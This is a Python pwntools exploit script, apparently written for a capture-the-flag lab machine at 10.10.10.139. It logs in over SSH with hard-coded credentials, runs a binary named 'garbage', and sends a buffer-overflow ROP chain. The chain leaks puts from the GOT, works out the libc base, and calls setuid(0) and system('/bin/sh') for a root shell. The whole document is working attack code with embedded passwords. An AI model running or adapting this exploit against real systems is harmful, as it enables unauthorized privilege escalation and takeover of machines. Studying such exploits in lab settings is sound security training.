from pwn import *
 
context(terminal=['tmux','new-window'])
 
margo = ssh("margo","10.10.10.139",22,"iamgod$08")
 
context(os='linux', arch='amd64')
 
p = margo.process("garbage")
 
password = 'N3veRF3@r1iSh3r3!' + '\x00'
 
rsp_offset = 136
 
auth = p64(0x401513)
got_puts = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_puts = p64(0x401050)
 
junk = 'A' * (rsp_offset - len(password))
 
payload = password + junk + pop_rdi + got_puts + plt_puts + auth
 
p.sendline(payload)
p.recvuntil('ed.')
leaked_puts = u64(p.recvn(8).strip().ljust(8,'\x00'))
 
log.success("Leaked puts@GLIBC: " + hex(leaked_puts))
 
libc_puts = 0x809c0
libc_system = 0x4f440
libc_sh = 0x1b3e9a
libc_setuid = 0xe5970
 
libc_base = leaked_puts - libc_puts
 
system = p64(libc_base + libc_system)
sh = p64(libc_base + libc_sh)
setuid = p64(libc_setuid + libc_base)
 
payload = password + junk + pop_rdi + '\x00'*8 + setuid + pop_rdi + sh + system
p.sendline(payload)
 
p.sendline("whoami")
p.interactive()
